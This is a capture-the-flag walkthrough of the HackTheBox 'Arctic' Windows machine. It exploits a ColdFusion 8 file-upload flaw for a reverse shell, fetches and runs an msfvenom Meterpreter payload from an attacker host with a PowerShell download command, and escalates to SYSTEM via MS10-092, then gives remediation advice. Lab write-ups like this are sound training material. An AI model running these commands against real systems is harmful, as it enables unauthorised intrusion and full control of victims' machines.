# HTB — Arctic | Professional Walkthrough

**Difficulty:** Easy  •  **Category:** Outdated Components / Local Privesc  •  **OS:** Windows  •  **Focus:** Adobe ColdFusion 8 (TCP/8500)

> Sanitized: no flags, credentials, or live target details. `<TARGET_IP>` / `<ATTACKER_IP>` replace live values.

## Executive Summary
Arctic runs an outdated **Adobe ColdFusion 8** application server whose administrative interface is exposed on **TCP/8500**. ColdFusion 8 is affected by an unauthenticated arbitrary file-upload flaw that lets us drop and execute a JSP payload, yielding a shell as the service account `arctic\tolis`. The host is a legacy, unpatched **Windows Server 2008 R2**, so a public local exploit escalates from the service account to **NT AUTHORITY\SYSTEM**.

**Risks:** OWASP A06; A05; CWE-434; CWE-269; CWE-1104.

## 1. Recon & Port Scanning
Full TCP sweep, then targeted service/version + default scripts on the open ports:
```bash
sudo nmap -Pn -sS --min-rate 3000 -p- <TARGET_IP> -oA nmap/full
sudo nmap -Pn -sV -sC -p 135,8500,49154 <TARGET_IP> -oA nmap/sv
```
Sanitized result:
```
PORT      STATE SERVICE   VERSION
135/tcp   open  msrpc     Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc     Microsoft Windows RPC
```
Port **8500/tcp** is the ColdFusion application server; RPC (135/49154) confirms Windows.

## 2. Service Enumeration
Browsing `http://<TARGET_IP>:8500/` returns a directory listing after a short delay (the JVM is slow to warm up). The interesting path is the admin console:
```
http://<TARGET_IP>:8500/CFIDE/administrator/
```
The login page banner identifies **Adobe ColdFusion 8** — a version affected by a well-known unauthenticated file-upload → RCE, with a public PoC available.

## 3. Foothold — Unauthenticated File Upload → RCE
The PoC abuses the file-upload flaw to write a JSP payload into a web-served directory, then requests it for code execution. ColdFusion is slow to respond, so the Metasploit module is unreliable here; the standalone Python PoC is used instead. Edit the PoC variables:
```python
lhost = '<ATTACKER_IP>'   # attacker (listener)
lport = 4444
rhost = '<TARGET_IP>'     # ColdFusion target
rport = 8500
```
Start a listener and run the PoC (it builds the payload with msfvenom, uploads it, and triggers it):
```bash
nc -lvnp 4444
python3 poc.py
```
Sanitized result — shell as the service account:
```
C:\ColdFusion8\runtime\bin> whoami
arctic\tolis
```
User flag: `C:\Users\tolis\Desktop\user.txt` (redacted).

## 4. Post-Exploitation — Upgrade to Meterpreter
Generate an executable payload, host it, then download and run it on the target to catch a more stable Meterpreter session for the privesc step:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4242 -f exe > shell.exe
python3 -m http.server 8000
```
On the target shell:
```cmd
powershell "(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8000/shell.exe','shell.exe')"
.\shell.exe
```
Catch it in Metasploit:
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4242
run
```

## 5. Privilege Escalation — Missing OS Patches
The box is an old, unpatched Windows Server 2008 R2. Enumerate local exploits:
```
run post/multi/recon/local_exploit_suggester
```
Multiple candidates return. The intended path is a legacy Task Scheduler / kernel privesc (MS10-092 "schelevator"; MS10-059 is also viable). The exploit needs an x64 process, so migrate first, then run it:
```
ps                       # find an x64 process owned by our user (e.g. jrunsvc.exe)
migrate <x64_PID>
run exploit/windows/local/ms10_092_schelevator LHOST=<ATTACKER_IP> LPORT=5555
```
Sanitized result:
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Root flag: `C:\Users\Administrator\Desktop\root.txt` (redacted).

## Remediation (summary)
Upgrade off ColdFusion 8 to a supported release and apply the file-upload patches; remove or firewall the admin interface (network ACLs / VPN); run the application under a least-privilege service account. Bring the OS to a supported, fully patched Windows Server release to remove the local privilege-escalation vectors.

See `FINDINGS.md` for detailed findings, impact and re-test.
